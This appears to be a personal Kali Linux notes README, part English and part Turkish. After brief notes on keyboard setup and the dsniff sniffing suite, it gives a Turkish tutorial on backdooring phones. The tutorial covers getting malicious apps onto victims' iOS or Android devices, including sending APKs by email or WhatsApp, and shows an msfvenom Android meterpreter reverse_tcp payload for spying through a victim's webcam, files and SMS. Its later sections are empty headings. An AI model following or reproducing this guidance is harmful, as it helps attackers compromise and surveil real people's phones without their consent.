# kali
Useful codes for kali linux

## Keyboard Commands
```setxkbmap tr``` -> to change keyboard language option. After shut down Kali Linux, this must be run once again because it will no more available. 

Kali Linux is case sensible.

```mkdir``` -> Creates a new folder.


```apt-get install dsniff```

dSniff is a set of password sniffing and network traffic analysis tools written by security researcher and startup founder Dug Song to parse different application protocols and extract relevant information. dsniff, filesnarf, mailsnarf, msgsnarf, urlsnarf, and webspy passively monitor a network for interesting data (passwords, e-mail, files, etc.). arpspoof, dnsspoof, and macof facilitate the interception of network traffic normally unavailable to an attacker (e.g., due to layer-2 switching). sshmitm and webmitm implement active man-in-the-middle attacks against redirected SSH and HTTPS sessions by exploiting weak bindings in ad-hoc PKI.[2] [3]

```passwd```
changes password

## Backdoor Applications


### Backdoor IOS and Android

IOS de bir uygulama yaptigimizda bunu kullaniciya ulastirmak icin elimizde cok az yol var. 
1)AppStore a koymak zorundayiz.
2)Kurban telefonunu fiziksel olarak elimize alip telefonu kablo ile MaC imize baglayip uygulamayi telefona indirebiliyoruz
3)Apple Business Developer hesabi ile uygulama ciktigimizda bunu AppStore a yuklememiz gerekmiyor. O isletmedeki belli kullanicilara uygulamayi acabiliyoruz. Bu sayede de zararli yazilimlari kullaniciya gonderebiliyoruz. 

Android - Google Play

Android de de siki denetim var. Diyelim ki bir app yazdik hem IoS hem de Android, Android e o gun yukleyebiliriz ama IoS tarafi cok inceleme yaptigindan o gun yayinlanmayabilir. Icersiinde bir backdoor uygulamasi olan app sonsuza kadar da Google paly de kalacak anlamina gelmemeli bu. Bir gun o app de silinir. Bunun yerine app i Google Play e yukleyip kullanicilara mesaj yoluyla(email, whatsapp vb) gibi gondermeyi tercih ederler Android de. 


Kullanicinin tek yapmasi gereken Google Play ayarlarinda Google Play store disindaki app lere olan izin kutusunu da acmis olmasi. Google play de app i mesaj yoluyla birilerine gonderebiliyoruz. 

Telefon icinde backdoor ureten araclardan bazilari hali hazirda Kali Linux icerisinde mevcut.

```msfvenom```
-p -- payload; Hangi isletim sistemine, hangi ortamda nasil bir saldiriyla backdoor un olusacagi belirtilir.  Andoid icin olusturacagim APK dosyasinda bu payload da belirttigimiz tum arametreler yer alacaktir. 

APK Nedir? Bir kod yazildiktan sonra Android de uygulama haline getirdigimiz son dosyadir. Windows daki .exe dosyalari gibi. 
```msfvenom``` bize bir APK cikartacak, biz de bu APK yi kullaniciya yollayacagiz, kullanici da tikladiginda bizim Kali Linux mize bir baglanti gelecek. 

#### msfvenom -p nasil kullanilir?
Ornegin Windows icin bir backdoor uygulamasi olustursaydik -p ye isletim sistemi olarak Windows u belirtecektik.
Benzer sekilde Android icin;

```msfvenom -p android/meterpreter/reverse_tcp```

```meterpreter``` bir session aracidir. Ne demek session araci? Kurban hacklendiginde bizde meterpreter adinda bir session acilacak. Session, baglanti acilmasi demek. Bu meterpreter in ozelliklerini(dosya sisteminde gezinmek, kurbanin webcamini acmak, telefonundan sms yollamak) kullanip kurbanin telefonunda istedgimiz seyleri yapabilecegiz. Kurbani hackledikten sonra yapilabilecek en iyi seylerden biri meterpreter in acik oldugundan amin olmak. 

```reverse_tcp``` ters baglaanti anlamina gelir

Backdoor larda iki secenek var;
1) Benim Kali Linux umden kurbana bir baglanti istegi yollamak; bu secenek cogu zaman Pc de veya mobile da kurbana baglanti istegi gittiginde bir firewall ya da guvenlik onlemi varsa bu cok kolay seilde fark edilebilir. 
2) reverse_tcp de ise kurban dan bize baglanti geliyor.
3)                         


### Payload

### IP Adresses

### Tunnel Service

### Create an APK

### Listening

### Signing 


### Hacking the Mobile phone
